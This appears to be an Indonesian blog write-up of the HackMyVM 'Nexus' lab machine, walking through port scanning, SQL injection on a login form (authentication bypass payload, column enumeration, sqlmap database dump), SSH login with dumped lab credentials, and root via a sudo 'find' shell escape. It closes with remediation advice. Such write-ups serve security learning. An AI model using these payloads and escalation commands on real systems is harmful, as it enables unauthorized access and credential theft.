---
layout: post
title: "HackMyVM-Nexus"
date: 2025-11-07 14:38:00 +0700
categories: [HackMyVM, Easy]
tags: [sql-injection, ssh, privilege-escalation, linux, web-security]
image:
  path: /assets/img/post/HackMyVm-Nexus/banner.png
author: HanzXD
---

## Overview

Nexus adalah mesin CTF yang menampilkan kerentanan SQL Injection pada login form yang dapat dieksploitasi untuk mendapatkan kredensial user. Setelah mendapatkan akses SSH, privilege escalation dilakukan melalui misconfigured sudo permissions pada binary `find`.

**Difficulty:** Easy  
**Target IP:** 192.168.80.132  

---

## Reconnaissance

### Port Scanning

Memulai dengan scan menggunakan Nmap dan Rustscan untuk mengidentifikasi service yang berjalan:

```bash
nmap -sS -sC -sV 192.168.80.132
```

**Hasil Scan:**

```
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0) 
| ssh-hostkey:  
|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA) 
|_  256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519) 
80/tcp open  http    Apache httpd 2.4.62 ((Debian)) 
|_http-title: Site doesn't have a title (text/html). 
|_http-server-header: Apache/2.4.62 (Debian) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Rustscan Result:**

```
Open 192.168.80.132:22 
Open 192.168.80.132:80
```

Port yang teridentifikasi:
- **Port 22** - SSH (OpenSSH 9.2p1)
- **Port 80** - HTTP (Apache 2.4.62)

---

## Web Enumeration

Karena port 80 (HTTP) terbuka, saya mengaksesnya melalui browser.

![Web Interface](/assets/img/post/HackMyVm-Nexus/ss1.png)

### Directory Bruteforcing

Menggunakan directory bruteforcing untuk menemukan endpoint tersembunyi:

```bash
feroxbuster -u http://192.168.80.132/
```

**Endpoint Menarik yang Ditemukan:**

```
[13:08:38] 200 -   13KB - /index2.php 
[13:08:47] 200 -  241B  - /login.php
```

### Investigating index2.php

Saya mencoba mengakses `index2.php`:

![index2.php](/assets/img/post/HackMyVm-Nexus/ss2.png)

Ditemukan direktori tambahan yang menarik: `/auth-login.php`

![auth-login.php](/assets/img/post/HackMyVm-Nexus/ss3.png)

---

## Vulnerability Discovery - SQL Injection

### Testing Login Form

Mencoba login dengan kredensial test untuk melihat respons server:

**Request:**

```http
POST /login.php HTTP/1.1
Host: 192.168.80.132
Content-Length: 19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.80.132
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Referer: http://192.168.80.132//auth-login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

user=test&pass=test
```

**Response:**

```html
<pre style='color:#00ff00;'>Acceso denegado.</pre>
```

Login ditolak dengan pesan "Acceso denegado" (Access denied).

### Triggering SQL Error

Saya mencoba menambahkan tanda kutip (`'`) pada parameter password untuk memicu error:

**Payload:**

```
user=test&pass=test'
```

**Response:**

```html
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''test''' at line 1 in /var/www/html/login.php:22
Stack trace:
#0 /var/www/html/login.php(22): mysqli->query()
#1 {main}
  thrown in <b>/var/www/html/login.php</b> on line <b>22</b><br />
```

**Berhasil!** Error mysqli mengkonfirmasi bahwa aplikasi vulnerable terhadap **SQL Injection**.

### Basic SQL Injection Bypass

Mencoba payload SQL Injection sederhana untuk bypass authentication:

**Payload:**

```
user=test&pass=test' or 1=1--+-
```

**Response:**

```html
<pre style='color:#00ff00;'>Acceso concedido. Bienvenido, test.</pre>
```

**Sukses!** Berhasil login dengan pesan "Acceso concedido. Bienvenido, test." (Access granted. Welcome, test.)

---

## SQL Injection Exploitation

### Error-Based SQL Injection

Mencoba menentukan jumlah kolom dalam database menggunakan `ORDER BY`:

**Testing Column Count:**

```
Payload: user=test&pass=test' order by 1--+-  
Response: Acceso denegado.

Payload: user=test&pass=test' order by 2--+-  
Response: Acceso denegado.

Payload: user=test&pass=test' order by 3--+-  
Response: Acceso denegado.

Payload: user=test&pass=test' order by 4--+-  
Response: Fatal error - Unknown column '4' in 'ORDER BY'
```

Dari error ini, dapat disimpulkan bahwa database memiliki **3 kolom**.

### Automated Exploitation with SQLMap

Menggunakan SQLMap untuk automasi proses exploitation:

**SQLMap Command:**

```bash
sqlmap -r login.req --batch --dump
```

**Request File (login.req):**

```http
POST /login.php HTTP/1.1
Host: 192.168.80.132
Content-Type: application/x-www-form-urlencoded

user=test&pass=test*
```

> **Note:** Tanda `*` menandakan parameter yang vulnerable

### Extracted Databases

**Available Databases:**

```
[*] information_schema 
[*] mysql 
[*] Nebuchadnezzar 
[*] performance_schema 
[*] sion 
[*] sys
```

Database yang menarik: **sion**

### Dumping Database 'sion'

**Tables in sion:**

```
Database: sion 
[1 table] 
+-------+ 
| users | 
+-------+
```

**Dumping 'users' Table:**

```
Database: sion 
Table: users 
[2 entries] 
+----+--------------------+----------+ 
| id | password           | username | 
+----+--------------------+----------+ 
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   | 
| 2  | cambiame08         | admin    | 
+----+--------------------+----------+
```

**Kredensial yang Didapat:**
- `shelly:F4ckTh3F4k3H4ck3r5`
- `admin:cambiame08`

---

## Initial Access - SSH

### SSH Login as shelly

Mencoba login SSH menggunakan kredensial yang telah didapat:

```bash
ssh shelly@192.168.80.132
```

**SSH Banner:**

```
**************************************************************
HackMyVM System                                              *
                                                             *
   *  .  . *       *    .        .        .   *    ..        *
 .    *        .   ###     .      .        .            *    *
    *.   *        #####   .     *      *        *    .       *
  ____       *  ######### *    .  *      .        .  *   .   *
 /   /\  .     ###\#|#/###   ..    *    .      *  .  ..  *   *
/___/  ^8/      ###\|/###  *    *            .      *   *    *
|   ||%%(        # }|{  #                                    *
|___|,  \\         }|{                                       *
                                                             *
                                                             *
Wellcome to Nexus Vault.                                     *
**************************************************************

######################
DONT TOUCH MY SYSTEM #
######################
```

**Verifikasi Access:**

```bash
shelly@NexusLabCTF:~$ id
uid=1000(shelly) gid=1000(shelly) grupos=1000(shelly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

**Berhasil!** Kita sekarang memiliki akses SSH sebagai user `shelly`.

### User Flag

Exploring home directory:

```bash
shelly@NexusLabCTF:~$ ls -la 
total 32 
drwx------ 4 shelly shelly 4096 nov  7 14:56 . 
drwxr-xr-x 4 root   root   4096 oct 13 17:04 .. 
-rw------- 1 shelly shelly  274 oct 13 17:57 .bash_history 
-rw-r--r-- 1 shelly shelly  220 mar 28  2025 .bash_logout 
-rw-r--r-- 1 shelly shelly 3530 may  8  2025 .bashrc 
drwxr-xr-x 3 shelly shelly 4096 abr 21  2025 .local 
-rw-r--r-- 1 shelly shelly  807 mar 28  2025 .profile 
drwxr-xr-x 2 root   root   4096 may  8  2025 SA
```

Ditemukan direktori **SA** yang dimiliki oleh root:

```bash
shelly@NexusLabCTF:~$ cd SA 
shelly@NexusLabCTF:~/SA$ ls 
user-flag.txt
```

**User Flag:**

```bash
shelly@NexusLabCTF:~/SA$ cat user-flag.txt  
 
   ▄█    █▄      ▄▄▄▄███▄▄▄▄    ▄█    █▄   
  ███    ███   ▄██▀▀▀███▀▀▀██▄ ███    ███  
  ███    ███   ███   ███   ███ ███    ███  
 ▄███▄▄▄▄███▄▄ ███   ███   ███ ███    ███  
▀▀███▀▀▀▀███▀  ███   ███   ███ ███    ███  
  ███    ███   ███   ███   ███ ███    ███  
  ███    ███   ███   ███   ███ ███    ███  
  ███    █▀     ▀█   ███   █▀   ▀██████▀   
                                         
HackMyVM 
Flag User ::  82kd8FJ5SJ00HMVUS3R36gd
```

---

## Privilege Escalation

### Sudo Privileges Enumeration

Memeriksa sudo privileges untuk user `shelly`:

```bash
shelly@NexusLabCTF:~/SA$ sudo -l 
sudo: unable to resolve host NexusLabCTF: Nombre o servicio desconocido 
Matching Defaults entries for shelly on NexusLabCTF: 
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, 
    env_keep+=LD_PRELOAD, use_pty 

User shelly may run the following commands on NexusLabCTF: 
    (ALL) NOPASSWD: /usr/bin/find
```

**Menarik!** User `shelly` dapat menjalankan `/usr/bin/find` sebagai root tanpa password.

### Exploiting Find (GTFOBins)

Binary `find` adalah target klasik untuk privilege escalation. Menggunakan teknik dari [GTFOBins](https://gtfobins.github.io/gtfobins/find/):

![GTFOBins Find](/assets/img/post/HackMyVm-Nexus/ss4.png)

**Exploitation:**

```bash
shelly@NexusLabCTF:~/SA$ sudo find . -exec /bin/sh \; -quit 
sudo: unable to resolve host NexusLabCTF: Nombre o servicio desconocido
```

**Verifikasi Root Access:**

```bash
# id
uid=0(root) gid=0(root) grupos=0(root)

# whoami
root
```

**ROOT ACCESS ACHIEVED!** 🎉

### Root Flag

Navigasi ke root directory:

```bash
# cd /root
# ls
Sion-Code
# cd Sion-Code
# ls
use-fim-to-root.png
```

Extract flag dari image menggunakan `strings`:

```bash
# strings use-fim-to-root.png | grep FLAG
;HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]
```

**Root Flag:** `HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]`

---

## Summary

### Flags Captured

- **User Flag:** `82kd8FJ5SJ00HMVUS3R36gd`
- **Root Flag:** `p3vhKP9d97a7HMV79ad9ks2s9`

### Attack Chain

1. **Reconnaissance** - Port scanning mengidentifikasi SSH (22) dan HTTP (80) services
2. **Web Enumeration** - Directory bruteforcing menemukan `/login.php` dan `/auth-login.php`
3. **SQL Injection Discovery** - Menemukan kerentanan SQL Injection pada login form
4. **SQL Injection Exploitation** - Menggunakan SQLMap untuk dump database dan mendapatkan kredensial:
   - `shelly:F4ckTh3F4k3H4ck3r5`
   - `admin:cambiame08`
5. **Initial Access** - Login SSH menggunakan kredensial shelly
6. **Privilege Escalation** - Eskalasi dari `shelly` ke `root` menggunakan sudo privilege pada `/usr/bin/find`

### Key Takeaways

- **SQL Injection** masih menjadi kerentanan yang umum ditemukan pada aplikasi web
- Error messages yang verbose dapat membantu attacker mengidentifikasi kerentanan
- Selalu validasi dan sanitasi input user
- Misconfigured sudo permissions adalah jalur umum untuk privilege escalation
- GTFOBins adalah resource yang sangat berharga untuk binary exploitation
- Binaries seperti `find`, `vim`, `nano`, dan sejenisnya tidak boleh diberikan sudo access tanpa pembatasan

---

## Remediation Recommendations

1. **SQL Injection Protection:**
   - Gunakan Prepared Statements dan Parameterized Queries
   - Implementasikan ORM (Object-Relational Mapping)
   - Validasi dan sanitasi semua input user
   - Implementasikan input validation dengan whitelist approach
   - Disable error messages yang verbose di production

2. **Authentication Security:**
   - Implementasikan rate limiting pada login endpoints
   - Gunakan strong password policies
   - Implementasikan Multi-Factor Authentication (MFA)
   - Log semua failed login attempts

3. **Sudo Privileges:**
   - Review dan minimize sudo permissions
   - Hindari memberikan akses sudo pada binaries yang dapat dieksploitasi
   - Implementasikan principle of least privilege
   - Gunakan command restrictions dalam sudoers file
   - Regular audit sudo configurations

4. **General Security:**
    - Menjaga sistem dan aplikasi tetap mutakhir
    - Menerapkan pencatatan dan pemantauan yang tepat
    - Menggunakan Web Application Firewall (WAF)
    - Penilaian keamanan dan uji penetrasi secara berkala

---

Thanks for reading! Happy hacking! 🚀
